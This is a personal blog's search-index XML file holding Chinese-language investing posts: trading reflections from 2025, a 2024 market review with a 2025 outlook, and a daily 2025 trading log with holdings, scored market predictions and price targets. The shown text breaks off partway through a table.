<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>宏观笔记和策略反思</title>
    <link href="/2025/05/07/%E5%AE%8F%E8%A7%82%E7%AC%94%E8%AE%B0%E5%92%8C%E7%AD%96%E7%95%A5%E5%8F%8D%E6%80%9D/"/>
    <url>/2025/05/07/%E5%AE%8F%E8%A7%82%E7%AC%94%E8%AE%B0%E5%92%8C%E7%AD%96%E7%95%A5%E5%8F%8D%E6%80%9D/</url>
    
    <content type="html"><![CDATA[<h3 id="2025年9月1日"><a href="#2025年9月1日" class="headerlink" title="2025年9月1日"></a>2025年9月1日</h3><h4 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h4><ol><li>4月2日特朗普宣布对等关税后，立讯精密连续收出三个跌停后，弱势修复随即转跌盘整，待抄底的散户和融资盘离场后才拉升直至回到年内前高</li><li>中金黄金在事故利空后跳空大跌，但基本面和成长逻辑并未发生改变，抄底资金进场放巨量后近一个月继续弱势阴跌，待黄金开启向上突破时大幅上涨创出年内新高</li></ol><h4 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h4><p>利空消息发布后会吸引大量相信股票价值的散户入场抄底，尤其是融资余额同步开启拉升，此时大资金可能会让股票持续震荡逼迫心急的投资者出局，此后遇到此类消息，应当等待在底部充分盘整后五日和十日均线均开启上行趋势确立右侧行情后入场</p><h3 id="2025年8月27日"><a href="#2025年8月27日" class="headerlink" title="2025年8月27日"></a>2025年8月27日</h3><h4 id="事件-1"><a href="#事件-1" class="headerlink" title="事件"></a>事件</h4><ol><li>东信和平25日公布中报前拉升，第二天大幅下杀6%</li><li>恒宝股份26日公布中报，第二天大幅下杀8%</li><li>上证指数连续刷新十年新高，大容量核心大涨，前期高位妖股滞涨</li></ol><h4 id="反思-1"><a href="#反思-1" class="headerlink" title="反思"></a>反思</h4><ol><li>拉尾盘有资金博弈消息的预期，但预期可能落空，拉尾盘可以适当止盈部分当日利润</li><li>股票盘中急杀后会有弱势反弹，但无量反弹有诱多嫌疑，可以在急杀的反弹过均价线之后抛售</li><li>指数上行时要及时做好风格切换，在前期炒作股票中有一定利润可以止盈博弈其他题材机会</li></ol><h3 id="2025年6月10日"><a href="#2025年6月10日" class="headerlink" title="2025年6月10日"></a>2025年6月10日</h3><h4 id="事件-2"><a href="#事件-2" class="headerlink" title="事件"></a>事件</h4><p>中美伦敦会谈传回不及预期信号，指数上破3400点后大幅跳水，稀土农业种业等战略资源型和防御型板块拉涨，但随即指数企稳回升，稀土板块暴拉后大幅回落，几乎跌去所有涨幅</p><h4 id="反思-2"><a href="#反思-2" class="headerlink" title="反思"></a>反思</h4><p>此类突发消息出现后主要是做T思维而不是追涨思维，资金可能借机诱空逼迫散户割肉出局，最好的操作思路是T+0ETF的高抛低吸，如今日的港股创新药ETF在指数企稳后大幅上涨约2%，有很大的博弈空间</p><h3 id="2025年5月13日"><a href="#2025年5月13日" class="headerlink" title="2025年5月13日"></a>2025年5月13日</h3><h4 id="事件-3"><a href="#事件-3" class="headerlink" title="事件"></a>事件</h4><p>昨日三点准时公布关税谈判结果，说明大钱已经收到消息，且收盘前有明显的抢筹动作，今日再度上演高开低走戏码</p><h4 id="反思-3"><a href="#反思-3" class="headerlink" title="反思"></a>反思</h4><p>盘后发布利好很可能被大资金借势做T，开盘卖出是比较明智的做法，同时可以观察夜盘商品的走势预测第二天股市</p><h3 id="2025年5月7日"><a href="#2025年5月7日" class="headerlink" title="2025年5月7日"></a>2025年5月7日</h3><h4 id="事件-4"><a href="#事件-4" class="headerlink" title="事件"></a>事件</h4><ol><li>国新办举办新闻发布会，三大金融部门负责人发表讲话，推出利好政策，宣布降准</li><li>印巴发生军事冲突，巴基斯坦宣布击落多架印度战机</li><li>阿里和京东掀起外卖价格战，高额补贴下出现低价奶茶咖啡，催化港股茶百道、蜜雪等大幅上涨</li></ol><h4 id="反思-4"><a href="#反思-4" class="headerlink" title="反思"></a>反思</h4><ol><li>早盘大幅跳空高开，大概率产生大量获利盘了结，开盘抛出，低点接回，可以降低持仓成本</li><li>军事冲突消息可能刺激军工股的短期行情，关注中航沈飞、洪都航空等</li><li>大趋势下难以直接购买的港股大票可以绕道基金进行布局，如泡泡玛特、老铺黄金等可以绕道港股消费ETF</li></ol>]]></content>
    
    
    <categories>
      
      <category>金融</category>
      
    </categories>
    
    
    <tags>
      
      <tag>投资</tag>
      
      <tag>宏观经济</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024投资总结与展望</title>
    <link href="/2024/12/26/2024%E6%8A%95%E8%B5%84%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B/"/>
    <url>/2024/12/26/2024%E6%8A%95%E8%B5%84%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B/</url>
    
    <content type="html"><![CDATA[<p class="note note-warning">文章内容为个人观点，不构成投资建议</p><h3 id="2024总结"><a href="#2024总结" class="headerlink" title="2024总结"></a>2024总结</h3><p>如果说2023是AI算力元年，2024则是AI应用元年。2023年英伟达带领美股走出加息周期的阴影，2024年美股七巨头领衔AI上下游产业公司遍地开花。A股AI算力龙头易中天走出翻倍行情，超级妖股AI芯片概念寒武纪暴涨5倍。新能源车行业继续闪耀中国智慧，华为汽车赛力斯业绩爆表，小米造车传奇带领股价直冲历史新高，下一个万亿巨头即将诞生。</p><p>2024年，美联储利率政策开启大转向，从9月的超预期降息50个基点到12月宣布明年将下调降息幅度，无一不牵动着全球资本市场乃至宏观经济。财政的大水漫灌和地缘冲突导致国际避险资本的涌入，使美国经济继续维持强势，并未出现硬着陆步入衰退周期。欧元区在经历能源危机、产能危机和罢工危机的多重冲击下，实体经济黯淡，资本市场却不断创下历史新高。日本央行在维持了长期的零利率和负利率政策后开启加息，似乎宣告着失去的30年的终结。</p><p>2024年，中国经济在对抗通缩中迎来了超级放水。CPI和PPI始终未见逆转预期，M1和M2的剪刀差不断拉大，居民端有效消费意愿不足。地方政府土地财政濒临绝境，化债之路道阻且长。人民币汇率持续弱势，企业融资投资信心不足。在经历了多轮降息降准和出台扶持房地产政策之后，却没有扭转基本面。在全球同步开启降息周期后，庙堂之上通过了12万亿大化债和发行巨额的特别国债等刺激政策，超级放水让地方政府轻装上阵，从而开启新一轮产业投资和消费刺激。</p><p>2024年，人类科技之光继续闪耀，纳斯达克100指数大涨近30%，站上20000点大关。去年落后于meta、微软和谷歌AI大模型布局的苹果凭借Apple Intelligence和多款高性能芯片重新夺回市值第一宝座，直冲4万亿美元大关。英伟达、博通、超微半导体等业绩不断超出市场预期。Trump回归白宫，国内矛盾得到缓和。法币危机和地缘冲突使流动性的蓄水池进一步扩容，黄金至年度最高点涨超30%，比特币暴涨160%突破十万美元大关，未来将进一步演绎。</p><p>2024年，A股在消费弱势和新能源行业内卷的基本面下，上证指数两次下探2600点，国家队频现沪深300ETF维护盘面。机构重仓、大白马和行业龙头持续下跌，隆基绿能和天齐锂业等新能源产业链上游龙头巨亏数十亿，股价再度接近腰斩。房地产业在一次又一次嗑药，一次又一次拉升后总是重归下跌，消费持续弱势，贵州茅台在经销商反水危机下不断破位，白酒板块前景黯淡。在全产业链集体缩容，降本增效的格局下，银行股逆市暴涨近40%，大权重电信运营商、煤炭石油等红利板块持续拉升维护指数。9月底，股市迎来了前所未有的政策支持，一波大牛市预期在全中国人民心中酝酿，指数如同火箭筒般直冲云霄，一改长达3年的颓势，但救市的同时一些即将退市的垃圾股、低价股被轮番暴炒，一些不明就里的投资者走向大赚和巨亏的两极分化。</p><h3 id="2025展望"><a href="#2025展望" class="headerlink" title="2025展望"></a>2025展望</h3><p>2025年，Trump的贸易大棒即将挥向全球，如果真如所传60%的对华加征关税，到底需要多大的内需刺激才能抵消外贸的冲击尚未可知。2024年是债牛和避险资产牛大年，央行绝不容许长债像今年这般演绎，一定会持续出手打压。2025年，中国经济任重道远，新的经济增长点扑朔迷离。低空经济、新质生产力和半导体产业能否迎来爆发，新能源行业拐点是否将至，都需要时间来回答。2025年，在确定性的关税利空背景下，难言经济基本面会有惊天逆转，房地产行业会延续24年的弱势，居民端小宗消费如冰雪经济、以旧换新等会有一些亮点，但消费欲望能否被有效刺激要打上一个巨大的问号。财政赤字率的上调和化债大水漫灌下，国有资本的投资会进一步发挥主导作用，A股也会在大型项目、重大科技突破和刺激性政策中出现中短期小范围牛市，但全面牛市的概率很小。2025年，全球地缘紧张局势将在美国政策转向的背景下有效缓解，但法币危机将继续演绎。石油价格不会出现大幅波动，在60-75美元区间反复震荡。黄金作为贵金属具有货币属性，会继续上涨至3000美元&#x2F;盎司，比特币也会在美国政策的支持下继续走牛。人民币会在关税大棒的打压下继续贬值至7.5以上，国内黄金价格预计将涨至700元&#x2F;克。美股的走势难以预料，各大科技巨头的算力军备竞赛已经走过了它最激烈的阶段，OpenAI也没能推出惊艳世界乃至改变世界的新产品，通用人工智能能否在25年迎来举世瞩目的突破是美股尤其是科技巨头走势的决定性因素，叠加美股已经在继续拉高中出现疲态，流动性危机可能会在某个节点带崩整个资本市场。</p><p>2025年，继续追踪产业的重大突破和国有替代相关产业链的炒作预期。23年和24年在量化和游资风格引领下，炒小炒差炒玄学在很多人心中埋下了暴富欲望的种子，25年是否会继续演绎还是机构夺回定价权，业绩票和行业龙头能否支撑A股持续表现是最大的看点。2025年，继续关注新能源能否迎来行业拐点，红利板块是否会继续强势。2025年，应当减少平均仓位，在确定性的机会面前果断出击，在把握住机会后及时出场，在技术没有迎来拐点之前不胡乱操作，在狂热的炒作面前不随意追涨，把握市场轮动的节奏，跟随市场的方向，多样化投资选择，减少仓位集中。</p><p>最后，希望世界和平，国泰民安。</p><p>​                  2024年12月26日 写于上海</p>]]></content>
    
    
    <categories>
      
      <category>金融</category>
      
    </categories>
    
    
    <tags>
      
      <tag>投资</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025实盘记录</title>
    <link href="/2024/12/09/2025%E5%AE%9E%E7%9B%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/12/09/2025%E5%AE%9E%E7%9B%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h3 id="9月12日-周五"><a href="#9月12日-周五" class="headerlink" title="9月12日 周五"></a>9月12日 周五</h3><h3 id="9月10日-周三"><a href="#9月10日-周三" class="headerlink" title="9月10日 周三"></a>9月10日 周三</h3><h4 id="持仓"><a href="#持仓" class="headerlink" title="持仓"></a>持仓</h4><ul><li>卧龙电驱：今日继续回调，站在五日线，是良性回调，四季度还有预期。</li><li>领益智造：消费电子龙头，还未反包近日跌幅，耐心持有。</li><li>创业板人工智能ETF：今日大幅上攻带领创业板反弹，但全盘缩量，观察近日是否放量上攻。</li><li>三花智控：继续维持高位震荡，资金惜售，等待再次拉升脱离五日线可以高抛。</li><li>通威股份：昨日复产利空压制反内卷主题板块，继续持有等待题材轮动。</li><li>长白山：小幅放量大涨，站上五日线，还有炒作预期，如果顺利上攻锚定五日线高抛低吸。</li><li>洛阳钼业：继续回落，但下周有降息利好，可以继续持有。</li><li>东信和平：U型底显现，今日大幅上涨冲击十日线，明日若维持强势可以看二波预期。</li></ul><h3 id="9月9日-周二"><a href="#9月9日-周二" class="headerlink" title="9月9日 周二"></a>9月9日 周二</h3><h4 id="持仓-1"><a href="#持仓-1" class="headerlink" title="持仓"></a>持仓</h4><ul><li>卧龙电驱：今日跟随大盘回调，靠近五日线，是良性回调，四季度还有预期。</li><li>领益智造：消费电子龙头，还未反包近日跌幅，耐心持有。</li><li>创业板人工智能ETF：今日跌幅缩窄，跑赢创业板指，将继续在高位震荡。</li><li>三花智控：今日在大盘普跌的情况下继续维持高位震荡，资金惜售，等待再次拉升脱离五日线可以高抛。</li><li>通威股份：跟随大盘回调，但光伏是本轮还未进入主升浪的品种，可以耐心持有。</li><li>长白山：在十日线企稳，继续观察后期趋势。</li><li>洛阳钼业：有色金属大盘股，受益于美联储降息预期，基本面强势，可以做短线套利。</li></ul><h4 id="关注"><a href="#关注" class="headerlink" title="关注"></a>关注</h4><ul><li>创新药：主板创新药近期回落，表现较差，中下旬可能迎来风格切换炒作。</li><li>二波趋势：关注大幅回落后有走二波趋势的票，如数据港、中油资本。</li></ul><h3 id="9月8日-周一"><a href="#9月8日-周一" class="headerlink" title="9月8日 周一"></a>9月8日 周一</h3><h4 id="持仓-2"><a href="#持仓-2" class="headerlink" title="持仓"></a>持仓</h4><ul><li>卧龙电驱：今日大涨，观察明日分歧，明日大涨偏离均线过远可以适度减仓。</li><li>领益智造：消费电子龙头，还未反包近日跌幅，耐心持有。</li><li>创业板人工智能ETF：今日再次大跌，但宽幅震荡可能已至尾端。</li><li>三花智控：今日早盘快速拉升涨停，超十亿封单，盘中卖盘较小，资金一致性强，继续持有观察明日强度。</li><li>通威股份：周末预期落空，大幅回落，但光伏是本轮还未进入主升浪的品种，可以耐心持有。</li><li>长白山：继续大跌，是前期大幅上涨的获利了解，观察十日线和二十日线支撑是否企稳。</li><li>洛阳钼业：有色金属大盘股，受益于美联储降息预期，基本面强势，可以做短线套利。</li></ul><h4 id="关注-1"><a href="#关注-1" class="headerlink" title="关注"></a>关注</h4><ul><li>创新药：主板创新药近期回落，表现较差，中下旬可能迎来风格切换炒作。</li></ul><h3 id="9月5日-周五"><a href="#9月5日-周五" class="headerlink" title="9月5日 周五"></a>9月5日 周五</h3><h4 id="持仓-3"><a href="#持仓-3" class="headerlink" title="持仓"></a>持仓</h4><ul><li>卧龙电驱：今日涨停，继续脱离前期箱体，还有上攻预期，继续持有等待分歧。</li><li>领益智造：消费电子龙头，还未反包近日跌幅，耐心持有。</li><li>创业板人工智能ETF：今日大幅反包，持仓观察。</li><li>三花智控：机器人龙头，有低位补涨需求，连续上涨后减仓。</li><li>通威股份：新能源是低位补涨题材，周末有发酵预期，观察下周一强度。</li><li>长白山：冰雪经济龙头，四季度会持续炒作，耐心持有，短期可以做高抛低吸。</li><li>洛阳钼业：有色金属大盘股，受益于美联储降息预期，基本面强势，可以做短线套利。</li></ul><h4 id="关注-2"><a href="#关注-2" class="headerlink" title="关注"></a>关注</h4><ul><li>固态电池：近日固态电池连续强势，四季度还有炒作预期，但目前涨幅过大，可以等均线上移后考虑布局。</li></ul><h3 id="9月4日-周四"><a href="#9月4日-周四" class="headerlink" title="9月4日 周四"></a>9月4日 周四</h3><h4 id="持仓-4"><a href="#持仓-4" class="headerlink" title="持仓"></a>持仓</h4><ul><li>卧龙电驱：今日前期受大盘压制难以上攻，下午量化触发抛售，但四季度有宇树科技IPO预期，继续持有。</li><li>领益智造：消费电子龙头，连续多日调整，9月是消费电子大月，还有活跃预期，继续持有。</li><li>创业板人工智能ETF：今日大幅下跌，可能见顶，修复后清仓。</li></ul><h4 id="关注-3"><a href="#关注-3" class="headerlink" title="关注"></a>关注</h4><ul><li>有色金属：今日有色金属也跟随大盘回调，黄金也在创出新高后震荡，为后续介入提供了较好的机会。</li><li>冰雪经济：冰雪经济龙头长白山连续收出大阳线，近期回调回踩十日二十日线时是介入机会，看到突破去年前高。</li></ul><h3 id="9月3日-周三"><a href="#9月3日-周三" class="headerlink" title="9月3日 周三"></a>9月3日 周三</h3><h4 id="持仓-5"><a href="#持仓-5" class="headerlink" title="持仓"></a>持仓</h4><ul><li>卧龙电驱：机器人情绪龙头，昨日强势拉升脱离箱体，今日脱离板块走独立行情，未来可期，明日上涨后可能会出现资金分歧，可以适度止盈等待回调，明日回调可以继续持有。</li><li>领益智造：消费电子龙头，连续多日调整，9月是消费电子大月，还有活跃预期，继续持有。</li><li>科创芯片ETF：前期AI行情核心之一，连续两日回调，有修复预期。</li><li>创业板人工智能ETF：前期AI行情核心之一，机构抱团，还有炒作空间，但出现加速时要及时止盈。</li></ul><h4 id="关注-4"><a href="#关注-4" class="headerlink" title="关注"></a>关注</h4><ul><li>有色金属：美联储降息，全球大放水超级周期，有色金属有走强的基本面支撑，关注紫金矿业、江西铜业、白银有色等</li><li>证券：连续多日调整，行情进攻的核心标的，可以大盘逢低布局，关注金融科技ETF、证券ETF</li></ul><table><thead><tr><th align="center">日期</th><th align="center">收益率</th><th align="center">上证指数&#x2F;创业板指&#x2F;科创50</th><th>预测</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">1月2日</td><td align="center">-1.64</td><td align="center">-2.66 -3.79 -3.40</td><td>下周小周期反弹开始</td><td align="center">✅</td></tr><tr><td align="center">1月3日</td><td align="center">-4.71</td><td align="center">-1.57 -2.16 -1.41</td><td>急跌必有急涨，底部区间在3100-3150</td><td align="center">❌</td></tr><tr><td align="center">1月6日</td><td align="center">-2.12</td><td align="center">-0.14 -0.09 -0.82</td><td>创业板将率先反弹带领指数</td><td align="center">❌</td></tr><tr><td align="center">1月7日</td><td align="center">2.98</td><td align="center">0.71 0.70 2.86</td><td>反弹将继续延续，但月中旬将挑战底部</td><td align="center">✅</td></tr><tr><td align="center">1月8日</td><td align="center">1.33</td><td align="center">0.02 -0.98 -0.04</td><td>情绪继续修复，小盘股还有投机空间</td><td align="center">✅</td></tr><tr><td align="center">1月9日</td><td align="center">2.14</td><td align="center">-0.58 0.11 -0.38</td><td>没有诚意的反弹，短期大幅修复可能性不大</td><td align="center">✅</td></tr><tr><td align="center">1月10日</td><td align="center">-5.85</td><td align="center">-1.33 -1.76 -1.13</td><td>开启二次探底，一月份难有大行情出现</td><td align="center">❌</td></tr><tr><td align="center">1月13日</td><td align="center">-2.24</td><td align="center">-0.25 0.36 0.17</td><td>缩量横盘，还有一波跳水时间周期，底部区间下移</td><td align="center">❌</td></tr><tr><td align="center">1月14日</td><td align="center">2.79</td><td align="center">2.54 4.71 3.11</td><td>行情难有持续性，上涨空间有限，下旬继续弱势</td><td align="center">✅</td></tr><tr><td align="center">1月15日</td><td align="center">0.77</td><td align="center">-0.43 -1.82 -0.42</td><td>关注美国CPI数据，本周大幅下跌可能性极小</td><td align="center">✅</td></tr><tr><td align="center">1月16日</td><td align="center">1.74</td><td align="center">0.28 0.66 -2.17</td><td>下周波动加大，风险与机会并存，下跌是黄金坑</td><td align="center">❌</td></tr><tr><td align="center">1月17日</td><td align="center">-2.10</td><td align="center">0.18 0.78 0.99</td><td>弱势周期难有大幅上攻空间</td><td align="center">✅</td></tr><tr><td align="center">1月20日</td><td align="center">-0.20</td><td align="center">0.08 1.81 0.25</td><td>春季行情将在年后启动</td><td align="center">✅</td></tr><tr><td align="center">1月21日</td><td align="center">1.51</td><td align="center">-0.05 0.36 0.83</td><td>诸多题材将在年后酝酿第二波行情</td><td align="center">✅</td></tr><tr><td align="center">1月22日</td><td align="center">-0.88</td><td align="center">-0.89 -0.54 -0.10</td><td>资金面缺乏，在震荡中过年</td><td align="center">✅</td></tr><tr><td align="center">1月23日</td><td align="center">-0.92</td><td align="center">0.51 -0.37 -0.95</td><td>资金诚意就在明日，如果站回二十日线进入强势周期</td><td align="center">✅</td></tr><tr><td align="center">1月24日</td><td align="center">0.72</td><td align="center">0.70 1.36 0.90</td><td>站上二十日线，年前迎接红包行情</td><td align="center">❌</td></tr><tr><td align="center">1月27日</td><td align="center">-2.50</td><td align="center">-0.06 -2.73 -2.02</td><td>年后deepseek和人形机器人行情继续演绎</td><td align="center">✅</td></tr><tr><td align="center">2月5日</td><td align="center">3.51</td><td align="center">-0.65 -0.04 2.90</td><td>题材分化，AI和机器人行情内部分化</td><td align="center">❌</td></tr><tr><td align="center">2月6日</td><td align="center">1.94</td><td align="center">1.27 2.80 2.89</td><td>科技股近三日会出现分化回调</td><td align="center">✅</td></tr><tr><td align="center">2月7日</td><td align="center">1.72</td><td align="center">1.01 2.53 0.75</td><td>分化加剧，机器人板块回调，但题材行情延续</td><td align="center">✅</td></tr><tr><td align="center">2月10日</td><td align="center">2.98</td><td align="center">0.56 0.44 1.76</td><td>大盘在近两日开启回调</td><td align="center">✅</td></tr><tr><td align="center">2月11日</td><td align="center">0.00</td><td align="center">-0.12 -1.43 -1.19</td><td>题材继续分化调整，但趋势不变，不会出现连续大跌</td><td align="center">✅</td></tr><tr><td align="center">2月12日</td><td align="center">1.30</td><td align="center">0.85 1.81 1.63</td><td>科技股短期会出现回调，不会继续加速上涨</td><td align="center">✅</td></tr><tr><td align="center">2月13日</td><td align="center">-0.33</td><td align="center">-0.42 -0.71 -2.31</td><td>明天继续回调，是买入机会</td><td align="center">❌</td></tr><tr><td align="center">2月14日</td><td align="center">-0.14</td><td align="center">0.43 1.80 0.53</td><td>开启回调周期</td><td align="center">❌</td></tr><tr><td align="center">2月17日</td><td align="center">1.91</td><td align="center">0.27 0.51 1.45</td><td>放量滞涨，危险将至</td><td align="center">✅</td></tr><tr><td align="center">2月18日</td><td align="center">-3.78</td><td align="center">-0.93 -1.98 -2.52</td><td>还没有跌完</td><td align="center">❌</td></tr><tr><td align="center">2月19日</td><td align="center">1.61</td><td align="center">0.81 2.03 2.31</td><td>上升趋势不变</td><td align="center">✅</td></tr><tr><td align="center">2月20日</td><td align="center">0.82</td><td align="center">-0.02 -0.06 -0.14</td><td>下旬以震荡回调为主，3月才有挑战3400点的预期</td><td align="center">✅</td></tr><tr><td align="center">2月21日</td><td align="center">0.40</td><td align="center">0.85 2.51 5.97</td><td>炒作高潮结束，下周开启回调</td><td align="center">✅</td></tr><tr><td align="center">2月24日</td><td align="center">-0.95</td><td align="center">-0.18 -0.67 0.48</td><td>继续回调，DS概念会出现低吸机会</td><td align="center">✅</td></tr><tr><td align="center">2月25日</td><td align="center">0.26</td><td align="center">-0.80 -1.13 0.26</td><td>继续回调，3300点附近企稳</td><td align="center">✅</td></tr><tr><td align="center">2月26日</td><td align="center">2.17</td><td align="center">1.02 1.23 2.17</td><td>高位股近期会出现大幅回调</td><td align="center">✅</td></tr><tr><td align="center">2月27日</td><td align="center">1.41</td><td align="center">0.23 -0.52 -0.05</td><td>机器人近期会出现连续回撤，是入场机会</td><td align="center">✅</td></tr><tr><td align="center">2月28日</td><td align="center">-4.41</td><td align="center">-1.98 -3.82 -4.22</td><td>还没有跌完，越跌越买机器人</td><td align="center">❌</td></tr><tr><td align="center">3月3日</td><td align="center">-1.74</td><td align="center">-0.12 1.20 -1.52</td><td>指数上行空间有限，题材轮动会继续</td><td align="center">❌</td></tr><tr><td align="center">3月4日</td><td align="center">0.58</td><td align="center">0.22 -0.29 1.72</td><td>缩量横盘震荡，不补量还会继续探底</td><td align="center">❌</td></tr><tr><td align="center">3月5日</td><td align="center">0.92</td><td align="center">0.53 0.01 0.29</td><td>和昨日观点一致，DS概念题材炒作复苏</td><td align="center">✅</td></tr><tr><td align="center">3月6日</td><td align="center">1.81</td><td align="center">1.17 2.02 3.48</td><td>会继续上冲3400点，但近两日热门股会回调</td><td align="center">✅</td></tr><tr><td align="center">3月7日</td><td align="center">-0.24</td><td align="center">-0.25 -1.31 -1.24</td><td>周初再度回调后继续上冲</td><td align="center">✅</td></tr><tr><td align="center">3月10日</td><td align="center">-0.39</td><td align="center">-0.19 -0.25 -0.22</td><td>短期题材继续分化，权重压制盘面</td><td align="center">❌</td></tr><tr><td align="center">3月11日</td><td align="center">0.79</td><td align="center">0.41 0.19 -0.40</td><td>继续进入多头时间</td><td align="center">✅</td></tr><tr><td align="center">3月12日</td><td align="center">0.83</td><td align="center">-0.23 -0.58 -0.73</td><td>20日线是强弱分界线，会守住并上攻</td><td align="center">✅</td></tr><tr><td align="center">3月13日</td><td align="center">-3.44</td><td align="center">-0.39 -1.15 -2.11</td><td>红利补涨，题材补跌</td><td align="center">❌</td></tr><tr><td align="center">3月14日</td><td align="center">1.02</td><td align="center">1.81 2.80 1.72</td><td>进入红利炒作时间</td><td align="center">✅</td></tr><tr><td align="center">3月17日</td><td align="center">2.01</td><td align="center">0.19 -0.52 -0.45</td><td>科技股即将迎来回调周期</td><td align="center">✅</td></tr><tr><td align="center">3月18日</td><td align="center">-0.21</td><td align="center">0.11 0.61 0.61</td><td>明日结束震荡选择方向</td><td align="center">❌</td></tr><tr><td align="center">3月19日</td><td align="center">0.70</td><td align="center">-0.10 -0.28 -1.18</td><td>时间周期步入下旬，科技会有大幅杀跌出现</td><td align="center">✅</td></tr><tr><td align="center">3月20日</td><td align="center">-1.06</td><td align="center">-0.51 -1.00 -1.13</td><td>明日弱势震荡后拉回</td><td align="center">❌</td></tr><tr><td align="center">3月21日</td><td align="center">-1.91</td><td align="center">-1.29 -2.17 -2.06</td><td>下杀还未结束</td><td align="center">✅</td></tr><tr><td align="center">3月24日</td><td align="center">0.81</td><td align="center">0.15 0.01 0.29</td><td>敏感时间周期，多头难以发动行情</td><td align="center">✅</td></tr><tr><td align="center">3月25日</td><td align="center">-0.89</td><td align="center">0.00 -0.33 -1.36</td><td>量能继续萎缩则重演12月下跌</td><td align="center">✅</td></tr><tr><td align="center">3月26日</td><td align="center">0.70</td><td align="center">-0.04 -0.26 -0.26</td><td>缩量反弹不可持续，未来几日是减仓机会</td><td align="center">✅</td></tr><tr><td align="center">3月27日</td><td align="center">-0.42</td><td align="center">0.15 0.24 1.12</td><td>四月以涨大跌小为主旋律</td><td align="center">❌</td></tr><tr><td align="center">3月28日</td><td align="center">-1.96</td><td align="center">-0.67 -0.79 -1.07</td><td>关税落地是利空落地</td><td align="center">❌</td></tr><tr><td align="center">3月31日</td><td align="center">-0.73</td><td align="center">-0.46 -1.15 -0.66</td><td>还未见底</td><td align="center">✅</td></tr><tr><td align="center">4月1日</td><td align="center">-0.28</td><td align="center">0.38 -0.09 0.16</td><td>开始执行单吊策略</td><td align="center">✅</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td></td><td align="center"></td></tr></tbody></table><table><thead><tr><th align="center">日期</th><th align="center">股票</th><th align="center">价格</th><th align="center">涨跌幅</th><th align="center">预期价</th></tr></thead><tbody><tr><td align="center">5月6日</td><td align="center">立讯精密</td><td align="center">31.81</td><td align="center">3.11</td><td align="center">40.00</td></tr><tr><td align="center">5月7日</td><td align="center">立讯精密</td><td align="center">31.52</td><td align="center">-0.91</td><td align="center">40.00</td></tr><tr><td align="center">5月8日</td><td align="center">立讯精密</td><td align="center">32.74</td><td align="center">3.87</td><td align="center">40.00</td></tr><tr><td align="center">5月9日</td><td align="center">立讯精密</td><td align="center">32.08</td><td align="center">-2.02</td><td align="center">40.00</td></tr><tr><td align="center">5月12日</td><td align="center">立讯精密</td><td align="center">34.12</td><td align="center">6.36</td><td align="center">40.00</td></tr><tr><td align="center">5月13日</td><td align="center">立讯精密</td><td align="center">33.80</td><td align="center">-0.94</td><td align="center">40.00</td></tr><tr><td align="center">5月14日</td><td align="center">立讯精密</td><td align="center">33.52</td><td align="center">-0.83</td><td align="center">40.00</td></tr><tr><td align="center">5月15日</td><td align="center">立讯精密</td><td align="center">32.66</td><td align="center">-2.57</td><td align="center">40.00</td></tr><tr><td align="center">5月16日</td><td align="center">立讯精密</td><td align="center">32.50</td><td align="center">-0.49</td><td align="center">40.00</td></tr><tr><td align="center">5月19日</td><td align="center">中宠股份</td><td align="center">65.33</td><td align="center">-1.46</td><td align="center">100.00</td></tr><tr><td align="center">5月20日</td><td align="center">中宠股份</td><td align="center">69.23</td><td align="center">5.97</td><td align="center">100.00</td></tr><tr><td align="center">5月21日</td><td align="center">中宠股份</td><td align="center">63.80</td><td align="center">-7.84</td><td align="center">100.00</td></tr><tr><td align="center">5月22日</td><td align="center">中宠股份</td><td align="center">64.25</td><td align="center">0.71</td><td align="center">100.00</td></tr><tr><td align="center">5月23日</td><td align="center">中宠股份</td><td align="center">63.06</td><td align="center">-1.85</td><td align="center">100.00</td></tr><tr><td align="center">5月26日</td><td align="center">立讯精密</td><td align="center">31.24</td><td align="center">-0.19</td><td align="center">35.00</td></tr><tr><td align="center">5月27日</td><td align="center">立讯精密</td><td align="center">30.52</td><td align="center">-2.30</td><td align="center">35.00</td></tr><tr><td align="center">5月28日</td><td align="center">国中水务</td><td align="center">3.42</td><td align="center">-2.01</td><td align="center">4.00</td></tr><tr><td align="center">5月29日</td><td align="center">国中水务</td><td align="center">3.43</td><td align="center">0.29</td><td align="center">4.00</td></tr><tr><td align="center">5月30日</td><td align="center">国中水务</td><td align="center">3.31</td><td align="center">-3.50</td><td align="center">4.00</td></tr><tr><td align="center">6月3日</td><td align="center">中宠股份</td><td align="center">66.17</td><td align="center">5.52</td><td align="center">80.00</td></tr><tr><td align="center">6月4日</td><td align="center">中宠股份</td><td align="center">72.24</td><td align="center">9.17</td><td align="center">80.00</td></tr><tr><td align="center">6月5日</td><td align="center">中宠股份</td><td align="center">70.68</td><td align="center">-2.16</td><td align="center">80.00</td></tr><tr><td align="center">6月6日</td><td align="center">祥鑫科技</td><td align="center">41.69</td><td align="center">-2.14</td><td align="center">50.00</td></tr><tr><td align="center">6月9日</td><td align="center">祥鑫科技</td><td align="center">41.78</td><td align="center">0.22</td><td align="center">50.00</td></tr><tr><td align="center">6月10日</td><td align="center">祥鑫科技</td><td align="center">41.05</td><td align="center">-1.75</td><td align="center">50.00</td></tr><tr><td align="center">6月11日</td><td align="center">中宠股份</td><td align="center">68.27</td><td align="center">-1.34</td><td align="center">80.00</td></tr><tr><td align="center">6月12日</td><td align="center">中宠股份</td><td align="center">68.74</td><td align="center">0.69</td><td align="center">80.00</td></tr><tr><td align="center">6月13日</td><td align="center">港股创新药ETF</td><td align="center">1.190</td><td align="center">-2.94</td><td align="center">1.250</td></tr><tr><td align="center">6月16日</td><td align="center">港股创新药ETF</td><td align="center">1.180</td><td align="center">-0.84</td><td align="center">1.250</td></tr><tr><td align="center">6月17日</td><td align="center">港股创新药ETF</td><td align="center">1.123</td><td align="center">-4.83</td><td align="center">1.250</td></tr><tr><td align="center">6月18日</td><td align="center">投资组合</td><td align="center">33840</td><td align="center">0</td><td 